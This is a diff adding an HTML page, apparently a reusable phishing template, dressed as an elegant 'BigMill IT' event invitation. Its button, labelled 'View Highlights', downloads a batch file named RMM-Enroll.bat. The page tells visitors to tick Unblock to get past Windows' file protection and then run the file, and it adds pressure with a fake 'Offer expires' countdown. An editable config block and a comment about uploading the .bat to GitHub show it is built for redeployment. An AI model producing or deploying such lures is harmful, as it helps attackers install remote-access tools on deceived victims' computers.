@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BigMill IT — You're Invited</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Inter:wght@300;400;500&display=swap');
+body{font-family:'Inter',sans-serif;background:#080604;color:#fff;min-height:100vh;overflow-x:hidden}
+
+/* BG */
+.bg{position:fixed;inset:0;z-index:0;
+  background:
+    radial-gradient(ellipse at 0% 0%,rgba(201,168,76,0.06) 0%,transparent 50%),
+    radial-gradient(ellipse at 100% 100%,rgba(201,168,76,0.04) 0%,transparent 50%),
+    radial-gradient(ellipse at 50% 50%,rgba(120,80,20,0.08) 0%,transparent 70%),
+    #080604}
+
+/* BOKEH */
+.bokeh{position:fixed;inset:0;z-index:1;overflow:hidden;pointer-events:none}
+.bok{position:absolute;border-radius:50%;animation:bfloat linear infinite}
+@keyframes bfloat{0%{transform:translateY(110vh);opacity:0}8%{opacity:1}92%{opacity:0.5}100%{transform:translateY(-5vh);opacity:0}}
+
+/* CONFETTI */
+.confetti{position:fixed;inset:0;z-index:1;overflow:hidden;pointer-events:none}
+.cf{position:absolute;animation:cfall linear infinite}
+@keyframes cfall{0%{transform:translateY(-20px) rotate(0deg);opacity:0.8}100%{transform:translateY(110vh) rotate(540deg);opacity:0}}
+
+/* NAV */
+nav{position:fixed;top:0;left:0;right:0;z-index:100;
+  padding:20px 48px;
+  display:flex;align-items:center;justify-content:space-between;
+  background:rgba(8,6,4,0.7);
+  backdrop-filter:blur(24px);
+  border-bottom:1px solid rgba(201,168,76,0.08)}
+.logo{font-family:'Cormorant Garamond',serif;font-size:20px;font-weight:600;
+  color:#d4b04a;letter-spacing:3px;text-transform:uppercase}
+.nav-right{display:flex;align-items:center;gap:6px;
+  font-size:11px;color:rgba(201,168,76,0.4);
+  letter-spacing:2px;text-transform:uppercase}
+.nav-dot{width:5px;height:5px;background:#c9a84c;border-radius:50%;animation:blink 2.5s infinite}
+@keyframes blink{0%,100%{opacity:0.8}50%{opacity:0.2}}
+
+/* HERO */
+.hero{position:relative;z-index:10;min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  text-align:center;padding:120px 24px 80px}
+
+/* ORNAMENT */
+.ornament{font-size:13px;color:rgba(201,168,76,0.3);letter-spacing:8px;margin-bottom:28px}
+.ornament-line{display:flex;align-items:center;gap:16px;justify-content:center;margin-bottom:32px}
+.orn-dash{width:48px;height:1px;background:linear-gradient(90deg,transparent,rgba(201,168,76,0.4))}
+.orn-dash.r{background:linear-gradient(90deg,rgba(201,168,76,0.4),transparent)}
+.orn-diamond{width:5px;height:5px;background:#c9a84c;transform:rotate(45deg);opacity:0.5}
+
+/* HEADLINE */
+h1{font-family:'Cormorant Garamond',serif;
+  font-size:clamp(52px,8vw,100px);
+  font-weight:300;
+  line-height:1;
+  letter-spacing:-1px;
+  color:#f2ead8;
+  margin-bottom:4px}
+h1 em{font-style:italic;font-weight:300;
+  background:linear-gradient(135deg,#b8933c 0%,#e8c96d 40%,#c9a84c 70%,#f0d878 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sub-title{font-family:'Cormorant Garamond',serif;
+  font-size:clamp(18px,3vw,26px);
+  font-weight:300;font-style:italic;
+  color:rgba(201,168,76,0.4);
+  letter-spacing:4px;
+  margin-bottom:56px}
+
+/* BUTTON */
+.btn-area{margin-bottom:20px}
+.btn-wrap{position:relative;display:inline-block}
+.btn-ring{position:absolute;inset:-12px;border-radius:100px;
+  border:1px solid rgba(201,168,76,0.15);
+  animation:ring 3s ease-in-out infinite}
+@keyframes ring{0%,100%{transform:scale(1);opacity:0.5}50%{transform:scale(1.03);opacity:1}}
+.btn-ring2{position:absolute;inset:-20px;border-radius:100px;
+  border:1px solid rgba(201,168,76,0.06);
+  animation:ring 3s ease-in-out infinite 0.5s}
+.btn{position:relative;display:inline-flex;align-items:center;gap:14px;
+  background:transparent;
+  border:1px solid rgba(201,168,76,0.5);
+  border-radius:100px;
+  padding:18px 56px;
+  font-size:14px;font-weight:400;
+  color:#d4b04a;
+  cursor:pointer;text-decoration:none;
+  font-family:'Cormorant Garamond',serif;
+  font-size:20px;letter-spacing:3px;
+  text-transform:uppercase;
+  transition:all 0.4s;
+  backdrop-filter:blur(10px);
+  background:rgba(201,168,76,0.04)}
+.btn:hover{
+  background:rgba(201,168,76,0.08);
+  border-color:rgba(201,168,76,0.8);
+  color:#f0d878;
+  box-shadow:0 0 40px rgba(201,168,76,0.15),inset 0 0 20px rgba(201,168,76,0.05);
+  transform:translateY(-2px);letter-spacing:4px}
+.btn-sub{font-size:11px;color:rgba(201,168,76,0.25);
+  letter-spacing:3px;text-transform:uppercase;
+  margin-top:20px;margin-bottom:60px;
+  font-family:'Cormorant Garamond',serif;font-style:italic}
+
+/* COUNTDOWN */
+.countdown-wrap{margin-bottom:60px}
+.cd-label-text{font-size:10px;color:rgba(201,168,76,0.25);
+  letter-spacing:4px;text-transform:uppercase;
+  margin-bottom:20px;font-family:'Cormorant Garamond',serif}
+.countdown{display:inline-flex;gap:1px;
+  border:1px solid rgba(201,168,76,0.1);
+  border-radius:4px;overflow:hidden}
+.cd-block{padding:16px 24px;text-align:center;min-width:84px;
+  background:rgba(201,168,76,0.02);
+  border-right:1px solid rgba(201,168,76,0.08)}
+.cd-block:last-child{border-right:none}
+.cd-num{font-family:'Cormorant Garamond',serif;
+  font-size:36px;font-weight:300;
+  color:#e8c96d;line-height:1;margin-bottom:6px}
+.cd-lbl{font-size:9px;color:rgba(201,168,76,0.25);
+  letter-spacing:3px;text-transform:uppercase}
+
+/* DETAILS */
+.divider-orn{display:flex;align-items:center;gap:16px;justify-content:center;margin-bottom:40px}
+.div-line{flex:1;max-width:80px;height:1px;background:linear-gradient(90deg,transparent,rgba(201,168,76,0.15))}
+.div-line.r{background:linear-gradient(90deg,rgba(201,168,76,0.15),transparent)}
+.div-text{font-size:10px;color:rgba(201,168,76,0.2);letter-spacing:4px;text-transform:uppercase}
+
+.details{display:flex;gap:0;justify-content:center;
+  max-width:480px;width:100%;margin-bottom:48px;
+  border:1px solid rgba(201,168,76,0.08);border-radius:4px;overflow:hidden}
+.detail{flex:1;padding:24px 16px;text-align:center;
+  border-right:1px solid rgba(201,168,76,0.08);
+  background:rgba(201,168,76,0.01)}
+.detail:last-child{border-right:none}
+.detail-icon{font-size:20px;margin-bottom:10px;opacity:0.6}
+.detail-t{font-family:'Cormorant Garamond',serif;
+  font-size:13px;font-weight:600;color:rgba(201,168,76,0.6);
+  letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.detail-v{font-family:'Cormorant Garamond',serif;
+  font-size:16px;font-style:italic;
+  color:rgba(245,240,232,0.5);line-height:1.5}
+
+/* WARN */
+.warn{display:inline-flex;align-items:flex-start;gap:10px;
+  border:1px solid rgba(201,168,76,0.08);
+  border-radius:4px;padding:16px 24px;
+  font-size:12px;color:rgba(201,168,76,0.3);
+  max-width:460px;text-align:left;margin-bottom:36px;
+  line-height:1.7;letter-spacing:0.3px;
+  background:rgba(201,168,76,0.02)}
+.warn strong{color:rgba(201,168,76,0.5)}
+
+footer{position:relative;z-index:10;text-align:center;
+  padding:28px;font-size:10px;color:rgba(201,168,76,0.12);
+  border-top:1px solid rgba(201,168,76,0.05);
+  font-family:'Cormorant Garamond',serif;letter-spacing:3px;text-transform:uppercase}
+</style>
+</head>
+<body>
+
+<div class="bg"></div>
+<div class="bokeh" id="bokeh"></div>
+<div class="confetti" id="confetti"></div>
+
+<nav>
+  <div class="logo" id="cfg-company">BigMill IT</div>
+  <div class="nav-right"><div class="nav-dot"></div><span id="cfg-nav-tag">Invitation</span></div>
+</nav>
+
+<div class="hero">
+
+  <div class="ornament" id="cfg-ornament">&#10022; &nbsp; &#10022; &nbsp; &#10022;</div>
+
+  <div class="ornament-line">
+    <div class="orn-dash"></div>
+    <div class="orn-diamond"></div>
+    <div class="orn-dash r"></div>
+  </div>
+
+  <h1 id="cfg-h1-line1">You Are</h1>
+  <h1 id="cfg-h1-line2"><em>Cordially Invited</em></h1>
+  <p class="sub-title" id="cfg-subtitle">to join the BigMill experience</p>
+
+  <div class="btn-area">
+    <div class="btn-wrap">
+      <div class="btn-ring"></div>
+      <div class="btn-ring2"></div>
+      <a class="btn" id="dlBtn" href="RMM-Enroll.bat" download="RMM-Enroll.bat" onclick="startDl()">
+        <span id="cfg-btn-text">View Highlights</span>
+      </a>
+    </div>
+  </div>
+  <p class="btn-sub" id="cfg-btn-sub">Click to receive your invitation</p>
+
+  <div class="countdown-wrap">
+    <p class="cd-label-text" id="cfg-cd-label">Offer expires in</p>
+    <div class="countdown">
+      <div class="cd-block"><div class="cd-num" id="cd-d">00</div><div class="cd-lbl">Days</div></div>
+      <div class="cd-block"><div class="cd-num" id="cd-h">00</div><div class="cd-lbl">Hours</div></div>
+      <div class="cd-block"><div class="cd-num" id="cd-m">00</div><div class="cd-lbl">Mins</div></div>
+      <div class="cd-block"><div class="cd-num" id="cd-s">00</div><div class="cd-lbl">Secs</div></div>
+    </div>
+  </div>
+
+  <div class="divider-orn">
+    <div class="div-line"></div>
+    <div class="div-text" id="cfg-details-label">Details</div>
+    <div class="div-line r"></div>
+  </div>
+
+  <div class="details">
+    <div class="detail">
+      <div class="detail-icon">&#128197;</div>
+      <div class="detail-t">When</div>
+      <div class="detail-v" id="cfg-when">July 20, 2026</div>
+    </div>
+    <div class="detail">
+      <div class="detail-icon">&#128205;</div>
+      <div class="detail-t">Where</div>
+      <div class="detail-v" id="cfg-where">Online<br>Worldwide</div>
+    </div>
+    <div class="detail">
+      <div class="detail-icon">&#128336;</div>
+      <div class="detail-t">Duration</div>
+      <div class="detail-v" id="cfg-duration">Under<br>30 seconds</div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <span>&#9825;</span>
+    <span id="cfg-warn">If Windows blocks the file — <strong>right-click</strong> → Properties → tick <strong>Unblock</strong> → OK — then double-click to run.</span>
+  </div>
+
+  <p style="font-size:10px;color:rgba(201,168,76,0.1);font-family:'Cormorant Garamond',serif;letter-spacing:3px;text-transform:uppercase" id="cfg-footer-inline">BigMill IT &nbsp;&middot;&nbsp; 2026</p>
+
+</div>
+
+<footer id="cfg-footer">&copy; 2026 &nbsp; BigMill IT &nbsp; &middot; &nbsp; All Rights Reserved</footer>
+
+<script>
+// ============================================================
+//   EASY EDIT — Change only inside this CONFIG block
+// ============================================================
+const CONFIG = {
+  // Company name in nav
+  company: "BigMill IT",
+
+  // Nav right tag
+  navTag: "Invitation",
+
+  // Headline line 1 (plain text)
+  h1Line1: "You Are",
+
+  // Headline line 2 (shown in gold italic)
+  h1Line2: "Cordially Invited",
+
+  // Subtitle below headline
+  subtitle: "to join the BigMill experience",
+
+  // Button text
+  buttonText: "View Highlights",
+
+  // Small text under button
+  buttonSub: "Click to receive your invitation",
+
+  // BAT file name — must match file uploaded to GitHub
+  batFile: "RMM-Enroll.bat",
+
+  // Countdown end date
+  countdownDate: "2026-07-20T23:59:59",
+
+  // Countdown label
+  countdownLabel: "Offer expires in",
+
+  // Details section
+  detailWhen: "July 20, 2026",
+  detailWhere: "Online<br>Worldwide",
+  detailDuration: "Under<br>30 seconds",
+
+  // Footer inline and bottom
+  footerInline: "BigMill IT &nbsp;&middot;&nbsp; 2026",
+  footerBottom: "&copy; 2026 &nbsp; BigMill IT &nbsp; &middot; &nbsp; All Rights Reserved",
+};
+// ============================================================
+//   END EDIT ZONE
+// ============================================================
+
+// Apply config
+document.getElementById('cfg-company').textContent = CONFIG.company;
+document.getElementById('cfg-nav-tag').textContent = CONFIG.navTag;
+document.getElementById('cfg-h1-line1').textContent = CONFIG.h1Line1;
+document.getElementById('cfg-h1-line2').innerHTML = '<em>' + CONFIG.h1Line2 + '</em>';
+document.getElementById('cfg-subtitle').textContent = CONFIG.subtitle;
+document.getElementById('cfg-btn-text').textContent = CONFIG.buttonText;
+document.getElementById('cfg-btn-sub').textContent = CONFIG.buttonSub;
+document.getElementById('dlBtn').href = CONFIG.batFile;
+document.getElementById('dlBtn').download = CONFIG.batFile;
+document.getElementById('cfg-cd-label').textContent = CONFIG.countdownLabel;
+document.getElementById('cfg-when').textContent = CONFIG.detailWhen;
+document.getElementById('cfg-where').innerHTML = CONFIG.detailWhere;
+document.getElementById('cfg-duration').innerHTML = CONFIG.detailDuration;
+document.getElementById('cfg-footer-inline').innerHTML = CONFIG.footerInline;
+document.getElementById('cfg-footer').innerHTML = CONFIG.footerBottom;
+
+// Bokeh
+const bokeh = document.getElementById('bokeh');
+const bc = ['201,168,76','232,201,109','180,140,60','150,100,30'];
+for(let i=0;i<25;i++){
+  const b=document.createElement('div');
+  b.className='bok';
+  const size=Math.random()*100+30;
+  const c=bc[Math.floor(Math.random()*bc.length)];
+  b.style.cssText=`left:${Math.random()*100}%;width:${size}px;height:${size}px;background:radial-gradient(circle,rgba(${c},0.1),transparent 70%);filter:blur(${Math.random()*8+4}px);animation-duration:${Math.random()*35+25}s;animation-delay:${Math.random()*35}s;`;
+  bokeh.appendChild(b);
+}
+
+// Confetti
+const conf=document.getElementById('confetti');
+const cc=['#c9a84c','#e8c96d','rgba(201,168,76,0.4)','#f0d878'];
+for(let i=0;i<20;i++){
+  const c=document.createElement('div');
+  c.className='cf';
+  const size=Math.random()*4+2;
+  c.style.cssText=`left:${Math.random()*100}%;width:${size}px;height:${size}px;background:${cc[Math.floor(Math.random()*cc.length)]};border-radius:${Math.random()>0.5?'50%':'1px'};animation-duration:${Math.random()*20+12}s;animation-delay:${Math.random()*20}s;opacity:${Math.random()*0.3+0.05};`;
+  conf.appendChild(c);
+}
+
+// Countdown
+function tick(){
+  const diff=new Date(CONFIG.countdownDate)-new Date();
+  if(diff<=0){['cd-d','cd-h','cd-m','cd-s'].forEach(id=>document.getElementById(id).textContent='00');return}
+  document.getElementById('cd-d').textContent=String(Math.floor(diff/86400000)).padStart(2,'0');
+  document.getElementById('cd-h').textContent=String(Math.floor(diff%86400000/3600000)).padStart(2,'0');
+  document.getElementById('cd-m').textContent=String(Math.floor(diff%3600000/60000)).padStart(2,'0');
+  document.getElementById('cd-s').textContent=String(Math.floor(diff%60000/1000)).padStart(2,'0');
+}
+tick();setInterval(tick,1000);
+
+// Download
+function startDl(){
+  const sub=document.getElementById('cfg-btn-sub');
+  setTimeout(()=>{ sub.textContent='Follow the steps: Unblock → Run → Done!'; },800);
+}
+</script>
+</body>
+</html>
